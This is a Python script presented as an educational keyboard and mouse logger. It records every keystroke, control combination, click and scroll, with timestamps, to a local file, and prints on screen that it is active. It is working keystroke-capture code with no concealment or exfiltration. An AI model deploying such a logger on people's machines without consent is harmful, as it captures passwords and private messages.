"""
Educational Key + Mouse Logger

This script is for educational purposes only. Use responsibly and ethically.
"""
import os
import argparse
from typing import TextIO
import threading
from datetime import datetime
from pynput import keyboard, mouse
from pynput.keyboard import Key, KeyCode

# Dictionary to map ASCII codes of CTRL key combinations to their string representations
# The ASCII codes from 1 to 26 correspond to CTRL+A to CTRL+Z
# The ASCII codes 28, 29, 30, 31 correspond to \, ], ^, _
# The ASCII code 27 is ESC, but it is not included in this dictionary
# because it is used as part of the stop combination
COMBINATIONS_CTRL_KEYS = {
    1: "CTRL+A",
    2: "CTRL+B",
    3: "CTRL+C",
    4: "CTRL+D",
    5: "CTRL+E",
    6: "CTRL+F",
    7: "CTRL+G",
    8: "CTRL+H",
    9: "CTRL+I",
    10: "CTRL+J",
    11: "CTRL+K",
    12: "CTRL+L",
    13: "CTRL+M",
    14: "CTRL+N",
    15: "CTRL+O",
    16: "CTRL+P",
    17: "CTRL+Q",
    18: "CTRL+R",
    19: "CTRL+S",
    20: "CTRL+T",
    21: "CTRL+U",
    22: "CTRL+V",
    23: "CTRL+W",
    24: "CTRL+X",
    25: "CTRL+Y",
    26: "CTRL+Z",
    28: "CTRL+\\",
    29: "CTRL+]",
    30: "CTRL+^",
    31: "CTRL+_"
}

# Default value if typing interval is not specified by the user
# This value indicates that we won't group keystrokes
NOT_GROUPING_INTERVAL = -1.0

# The key combinations to stop the logger
STOP_KEY_COMBO_CTRL_LEFT = {keyboard.Key.ctrl_l, keyboard.Key.esc}
STOP_KEY_COMBO_CTRL_RIGHT = {keyboard.Key.ctrl_r, keyboard.Key.esc}

# The set to keep track of currently pressed shift, ctrl and alt keys
# This is used to check if the behaviour of scrolling, clicking or other keys has been modified
# E.g., if the user holds down the shift key and scrolls, we want to log when the shift key is released,
# because it might be used to scroll in horizontal direction.
# E.g., if the user holds down the ctrl key and clicks, we want to log when the ctrl key is released,
# because it might be used to select multiple items or open hyperlinks.
MODIFIERS_SET = {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift_l, keyboard.Key.shift_r, keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt_gr}

# The set of key that, combined with CTRL, SHIFT or ALT keys, have a different behaviour
KEYS_FOR_COMBINATIONS = {keyboard.Key.delete, keyboard.Key.backspace, keyboard.Key.enter, keyboard.Key.tab, keyboard.Key.end, keyboard.Key.home, keyboard.Key.page_down, keyboard.Key.page_up, keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right}

# Dictionary to store flags for logging the release of modifier keys
# if they were held down during other actions (e.g., mouse click/scroll).
LOG_RELEASE_MODIFIER_FLAGS = {
    keyboard.Key.ctrl_l: False,
    keyboard.Key.ctrl_r: False,
    keyboard.Key.shift_l: False,
    keyboard.Key.shift_r: False,
    keyboard.Key.alt_l: False,
    keyboard.Key.alt_r: False,
    keyboard.Key.alt_gr: False
}

# The set to keep track of currently pressed keys
# This is used to check if the stop combination is pressed
current_keys = set()

# Global variables for listeners
# These will be initialized in the start_listeners function
kb_listener = None
ms_listener = None

# The last time a key was pressed
last_key_time = None

# The typing interval for grouping keystrokes
# If the user doesn't specify an interval, we won't group keystrokes
typing_interval = None

# Locks for thread synchronization
shared_data_lock = threading.Lock() # Protects current_keys and LOG_RELEASE_MODIFIER_FLAGS
log_write_lock = threading.Lock()   # Protects writes to the log file and related file operations


def get_script_dir() -> str:
    """
    Returns the absolute path of the directory where the script is located.

    Returns:
        str: Absolute path to the script's directory.
    """
    return os.path.dirname(os.path.abspath(__file__))


def resolve_output_path(user_path: str) -> str:
    """
    Resolves the full output file path from a given user-specified path.
    If the path is relative, it will be made absolute based on the script's directory.
    If the path is a directory, "log.txt" will be appended to it.

    Args:
        user_path (str): The path provided by the user.

    Returns:
        str: The absolute path to the output file.
    """
    # Remove any surrounding quotes from the user path
    user_path = user_path.strip("\"'")

    # If the path is relative, make it absolute by joining it with the script's directory
    if not os.path.isabs(user_path):
        user_path = os.path.join(get_script_dir(), user_path)

    # If the user path ends with a separator or is a directory, append "log.txt" to it
    if user_path.endswith(os.sep) or os.path.isdir(user_path) or os.path.splitext(user_path)[1] == "":
        user_path = os.path.join(user_path, "log.txt")

    # Verify the directory exists; if not, create it
    parent_dir = os.path.dirname(user_path)
    if not os.path.exists(parent_dir):
        try:
            os.makedirs(parent_dir)
        except OSError as e:
            print(f"Error: cannot create directory '{parent_dir}': {e}")
            exit(1)

    return user_path


def get_last_char(log_file: TextIO) -> str:
    """
    Returns the last character written in the log file, or '\n' if the file is empty or the last character cannot be decoded.

    Args:
        log_file (TextIO): The log file to read from.

    Returns:
        str: The last character in the log file, or '\n' if the file is empty or the last character cannot be decoded.
    """
    with log_write_lock: # Acquire lock for file operations
        # Ensure all buffered data is written to the file
        log_file.flush()

        # Get the current position in the file
        pos = log_file.tell()

        # If the file is empty, return a newline character
        if pos == 0:
            return "\n"
        
        # Read a small chunk from the end of the file (up to 4 bytes)
        # to reliably get the last character, accounting for multi-byte UTF-8 characters.
        read_len = min(4, pos)

        # Move the file pointer to the chunk containing the last character(s)
        log_file.seek(pos - read_len)

        # Read the chunk
        last_char_bytes = log_file.read(read_len)

        # Come back to the original position (important if other operations expect the pointer at EOF for append)
        log_file.seek(pos)

        try:
            # Decode the bytes and get the actual last character
            return last_char_bytes.decode("utf-8")[-1]

        except UnicodeDecodeError:
            return "\n"


def log_event(log_file: TextIO, message: str) -> None:
    """
    Logs an event to the specified log file.
    The message is encoded in UTF-8 and written to the file.

    Args:
        log_file (TextIO): The log file to write events to.
        message (str): The message to log.
    """
    with log_write_lock: # Acquire lock before writing
        log_file.write(message.encode("utf-8"))
        # Ensure the message is written immediately
        log_file.flush()


def check_stop_combo(key) -> None:
    """
    Checks if the stop key combination has been pressed.
    If so, stops the keyboard listener and exits the program.

    Args:
        key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was pressed.
    """
    global kb_listener, ms_listener
    stop_listeners_flag = False

    # Protect access to current_keys
    with shared_data_lock:
        if key in STOP_KEY_COMBO_CTRL_LEFT or key in STOP_KEY_COMBO_CTRL_RIGHT:
            current_keys.add(key)

            if STOP_KEY_COMBO_CTRL_LEFT.issubset(current_keys) or \
               STOP_KEY_COMBO_CTRL_RIGHT.issubset(current_keys):
                stop_listeners_flag = True
    
    if stop_listeners_flag:
        print("[*] Stop combination detected. Shutting down listeners...")
        if kb_listener: kb_listener.stop()
        if ms_listener: ms_listener.stop()


def set_modifier_release_flags() -> None:
    """
    Sets flags in LOG_RELEASE_MODIFIER_FLAGS to True for any currently pressed
    modifier keys (Ctrl, Shift, Alt). This ensures their release is logged if
    they were held during another action (e.g., click, scroll, or combined key press).
    """
    # Acquire lock for accessing shared data
    with shared_data_lock:
        # Iterate over a copy of current_keys to avoid issues when also
        keys_snapshot = list(current_keys)
        for pressed_key in keys_snapshot:
            if pressed_key in LOG_RELEASE_MODIFIER_FLAGS: # LOG_RELEASE_MODIFIER_FLAGS is also shared
                LOG_RELEASE_MODIFIER_FLAGS[pressed_key] = True


def check_key_type(key) -> None:
    """
    Checks the type of the pressed key and returns its string representation.

    Args:
        key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was pressed.

    Returns:
        tuple: A tuple containing the string representation of the key and a boolean indicating if it's a special key.
    """
    is_special = False

    # Check if the pressed key is a character or a special key
    if isinstance(key, KeyCode):

        # If the pressed key is a character: it can be printable or a control character
        if key.char is not None:

            # Get the ASCII code of the character
            ascii_code = ord(key.char)

            # Check if the ASCII code is a control character
            if ascii_code in COMBINATIONS_CTRL_KEYS:
                k = f"Combo: {COMBINATIONS_CTRL_KEYS[ascii_code]}"
                is_special = True

            # Otherwise, check if the pressed key is a printable character
            elif key.char.isprintable():
                k = key.char

            # Otherwise, print the ASCII code of the character and set is_special to true to print it on a new line
            else:
                k = f"[ASCII: {ascii_code}]"
                is_special = True

        # If the KeyCode has no character (key.char is None), mark as UNKNOWN and ensure it's logged on a new line.
        else:
            k = "[UNKNOWN]"
            is_special = True

    # Otherwise, check if it's a special key
    elif isinstance(key, Key):
        k = f"Pressed: [{key.name.upper()}]"
        is_special = True

        # If the pressed key is a modifier (Shift, Ctrl, Alt), add it to the set of currently pressed keys.
        # This helps track active modifiers for logging their release later.
        if key in MODIFIERS_SET:
            # Operate in mutual exclusion on current_keys
            with shared_data_lock:
                current_keys.add(key)

        # If the pressed key is a key whose behaviour can change if pressed in combination with CTRL, SHIFT or ALT,
        # we will log also the release of the CTRL, SHIFT or ALT key currently pressed
        elif key in KEYS_FOR_COMBINATIONS:

            # So, check which of the currently pressed keys are modifiers we want to log on release
            set_modifier_release_flags()
                    
    # In all other cases, it's an unknown key
    else:
        k = "[UNKNOWN]"
        is_special = True

    return k, is_special


def on_press(key, log_file: TextIO) -> None:
    """
    Handles keyboard press events in non-grouped mode.
    Used when the user doesn't specify a typing interval.

    Args:
        key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was pressed.
        log_file (TextIO): The log file to write events to.
    """
    # Check key type (char, control, etc.).
    # In non-grouped mode it is not necessary to know whether it is a special character,
    # because the is_special value is only used to check whether it is necessary to switch to a new line in grouped mode
    k, _ = check_key_type(key)

    # Log the event to the file
    log_event(log_file, f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {k}\n")


def on_press_grouped(key, log_file: TextIO) -> None:
    """
    Handles keyboard press events in grouped mode.
    Used when the user specifies a typing interval.

    Args:
        key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was pressed.
        log_file (TextIO): The log file to write events to.
    """
    global last_key_time

    now = datetime.now()

    # Compute the elapsed time since the last key press
    # If last_key_time is None, it means this is the first key press
    elapsed = (now - last_key_time).total_seconds() if last_key_time else None

    # Check key type (char, control, etc.) and check if it's a special character
    k, is_special = check_key_type(key)
        
    # Retrieve the last character in the log file to avoid doubling newlines
    last_char = get_last_char(log_file)

    # If the character is special, or the elapsed time is None (first key press),
    # or the elapsed time is greater than the typing interval, or the last character is a newline,
    # the message should start on a new line with a timestamp
    start_new_line = (
        is_special
        or elapsed is None
        or elapsed > typing_interval
        or last_char == "\n"
    )

    # Construct the message to log
    if start_new_line:
        
        # Check if the last character is already a newline
        # If not, add a newline before the timestamp
        prefix = "\n" if last_char != "\n" else ""
        message = f"{prefix}{now.strftime('%Y-%m-%d %H:%M:%S')} - {k}"
    
    # If the pressed key is a character and the elapsed time is within the typing interval,
    # append it to the last message without a timestamp
    else:
        message = k

    # If the pressed key is a special key, add a newline at the end of the message
    if is_special and not message.endswith("\n"):
        message += "\n"

    # Set the last key time to the current time
    last_key_time = now

    # Log the event to the file
    log_event(log_file, message)


def handle_key_release_common(key) -> None:
    """
    Common logic for handling key release events.
    This function removes the released key from the set of currently pressed keys
    and check if it's a modifier key used in combination with other keys or mouse events.
    In this case, it's necessary to log the release of the key.

    Args:
        key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was released.

    Returns:
        Optional[str]: A formatted string message if the release should be logged, otherwise None.
    """
    # Initialize the message to None
    message_to_log = None

    # Operate in mutual exclusion on current_keys and LOG_RELEASE_MODIFIER_FLAGS
    with shared_data_lock:
        # Check if the released key is part of the stop combination or a modifier
        # If so, remove it from the current keys set
        if key in STOP_KEY_COMBO_CTRL_LEFT or \
           key in STOP_KEY_COMBO_CTRL_RIGHT or \
           key in MODIFIERS_SET:
            current_keys.discard(key) # Use discard to avoid KeyError if key is not in set

        # If the released key is a tracked modifier and its flag is set, prepare to log its release
        if key in LOG_RELEASE_MODIFIER_FLAGS and LOG_RELEASE_MODIFIER_FLAGS[key]:
            LOG_RELEASE_MODIFIER_FLAGS[key] = False
            # Prepare the message content while lock is held.
            # The actual logging (I/O) will happen outside this lock, using log_event's own lock.
            message_to_log = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Released: [{key.name.upper()}]\n"
    
    return message_to_log
    

def on_release(key, log_file: TextIO) -> None:
    """
    Handles keyboard release events in non-grouped mode.
    Used when the user doesn't specify a typing interval.
    
    Args:
        key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was released.
        log_file (TextIO): The log file to write events to.
    """
    # Call the handle_key_release_common function and, if a message is returned, it means that
    # it's necessary to log the release of the key
    message = handle_key_release_common(key)
    if message:
        log_event(log_file, message)


def on_release_grouped(key, log_file: TextIO) -> None:
    """
    Handles keyboard release events in grouped mode.
    Used when the user specifies a typing interval.
    
    Args:
        key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was released.
        log_file (TextIO): The log file to write events to.
    """
    # Call the handle_key_release_common function and, if a message is returned, it means that
    # it's necessary to log the release of the key
    message = handle_key_release_common(key)
    if message:
        # If the last character is not a newline, add a newline before the timestamp
        prefix = "\n" if get_last_char(log_file) != "\n" else ""
        log_event(log_file, f"{prefix}{message}")


def on_click(x: int, y: int, button, pressed: bool, log_file: TextIO) -> None:
    """
    Handles mouse click events in non-grouped mode.
    Used when the user doesn't specify a typing interval.

    Args:
        x (int): X-coordinate of the mouse event.
        y (int): Y-coordinate of the mouse event.
        button (pynput.mouse.Button): The mouse button involved.
        pressed (bool): True if button pressed, False if released.
        log_file (TextIO): The log file to write events to.
    """
    # If a modifier key is held during a click, flag it for logging upon its release
    if pressed: # Only set flags on press, not on release of the click
        
        # Check which of the currently pressed keys are modifiers we want to log on release
        set_modifier_release_flags()

    # Set the action based on whether the button is pressed or released
    action = "Pressed" if pressed else "Released"

    # Log the event to the file
    log_event(log_file, f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Mouse {action} {button.name} at ({x}, {y})\n")


def on_click_grouped(x: int, y: int, button, pressed: bool, log_file: TextIO) -> None:
    """
    Handles mouse click events in grouped mode.
    Used when the user specifies a typing interval.

    Args:
        x (int): X-coordinate of the mouse event.
        y (int): Y-coordinate of the mouse event.
        button (pynput.mouse.Button): The mouse button involved.
        pressed (bool): True if button pressed, False if released.
        log_file (TextIO): The log file to write events to.
    """
    # If a modifier key is held during a click, flag it for logging upon its release
    if pressed: # Only set flags on press, not on release of the click

        # Check which of the currently pressed keys are modifiers we want to log on release
        set_modifier_release_flags()

    # Set the action based on whether the button is pressed or released
    action = "Pressed" if pressed else "Released"

    # Check if the last character is already a newline
    # If not, add a newline before the timestamp
    prefix = "\n" if get_last_char(log_file) != "\n" else ""
    message = f"{prefix}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Mouse {action} {button.name} at ({x}, {y})\n"
    
    # Log the event to the file
    log_event(log_file, message)


def on_scroll(x, y, dx, dy, log_file: TextIO):
    """
    Handles mouse scroll events in non-grouped mode.
    Used when the user doesn't specify a typing interval.

    Args:
        x (int): X-coordinate of the mouse event.
        y (int): Y-coordinate of the mouse event.
        dx (int): Change in x-coordinate (horizontal scroll).
        dy (int): Change in y-coordinate (vertical scroll).
        log_file (TextIO): The log file to write events to.
    """
    # If a modifier key is held during a scroll, flag it for logging upon its release
    # Check which of the currently pressed keys are modifiers
    set_modifier_release_flags()
    
    # Log the event to the file
    log_event(log_file, f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy})\n")


def on_scroll_grouped(x, y, dx, dy, log_file: TextIO):
    """
    Handles mouse scroll events in grouped mode.
    Used when the user specifies a typing interval.

    Args:
        x (int): X-coordinate of the mouse event.
        y (int): Y-coordinate of the mouse event.
        dx (int): Change in x-coordinate (horizontal scroll).
        dy (int): Change in y-coordinate (vertical scroll).
        log_file (TextIO): The log file to write events to.
    """
    # If a modifier key is held during a scroll, flag it for logging upon its release
    # Check which of the currently pressed keys are modifiers
    set_modifier_release_flags()
    
    # Check if the last character is already a newline
    # If not, add a newline before the timestamp
    prefix = "\n" if get_last_char(log_file) != "\n" else ""
    message = f"{prefix}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy})\n"
    
    # Log the event to the file
    log_event(log_file, message)


def start_listeners(log_file: TextIO) -> None:
    """
    Starts keyboard and mouse listeners.
    If the interval is is not specified, it logs each keystroke without grouping.
    If the interval is specified, it groups keystrokes based on that interval. 

    Args:
        log_file (TextIO): The log file to write events to.
    """
    global kb_listener, ms_listener

    # Check if the user specified a typing interval
    if typing_interval == NOT_GROUPING_INTERVAL:

        # If the user didn't specify an interval, we log each keystroke without grouping
        kb_listener = keyboard.Listener(
            on_press = lambda k: (on_press(k, log_file), check_stop_combo(k)),
            on_release = lambda k: on_release(k, log_file)
        )

        # Set up mouse listener
        ms_listener = mouse.Listener(
            on_click = lambda x, y, b, p: on_click(x, y, b, p, log_file),
            on_scroll = lambda x, y, dx, dy: on_scroll(x, y, dx, dy, log_file)
        )

    else:

        # If the user specified an interval, we group keystrokes based on that interval
        kb_listener = keyboard.Listener(
            on_press = lambda k: (on_press_grouped(k, log_file), check_stop_combo(k)),
            on_release = lambda k: on_release_grouped(k, log_file)
        )
    
        # Set up mouse listener
        ms_listener = mouse.Listener(
            on_click = lambda x, y, b, p: on_click_grouped(x, y, b, p, log_file),
            on_scroll = lambda x, y, dx, dy: on_scroll_grouped(x, y, dx, dy, log_file)
        )

    print(f"[*] Logger active. Saving to: {log_file.name}")
    print(f"[*] Press Ctrl + Esc to stop.")

    # Start the keyboard and mouse listeners
    kb_listener.start()
    ms_listener.start()

    # Wait for the keyboard listener to finish
    kb_listener.join()

    # Stop the mouse listener
    ms_listener.stop()


if __name__ == "__main__":
    """
    Main function to parse command line arguments and start the logger.
    It calls the resolve_output_path function to get the output file path,
    sets the typing interval based on user input
    and calls the start_listeners function to start the keyboard and mouse listeners.
    The script uses argparse to handle command line arguments for the output file path and typing interval.
    """
    parser = argparse.ArgumentParser(description="Educational Key + Mouse Logger")
    parser.add_argument(
        "-o", "--output",
        help = "Path to the log file",
        default = os.path.join(get_script_dir(), "log.txt")
    )
    parser.add_argument(
        "-i", "--interval",
        help = "Time threshold (seconds) to group keystrokes (Recommended: 0.5)",
        type = float,
        default = NOT_GROUPING_INTERVAL # If the user doesn't specify, we won't group keystrokes
    )
    args = parser.parse_args()

    # Set the typing interval based on user input or default value
    typing_interval = args.interval

    # Resolve the output path and ensure the directory exists
    output_path = resolve_output_path(args.output)

    # Open the log file in append mode
    # and start the listeners
    try:
        with open(output_path, "a+b") as log_file:
            
            # Print the grouping message if the interval is specified
            if args.interval != NOT_GROUPING_INTERVAL:
                print(f"[*] Grouping keystrokes: {args.interval} seconds")

            start_listeners(log_file)

    except Exception as e:
        print(f"Unexpected error: {e}")
        raise

    else:
        print("[*] Logger stopped successfully.")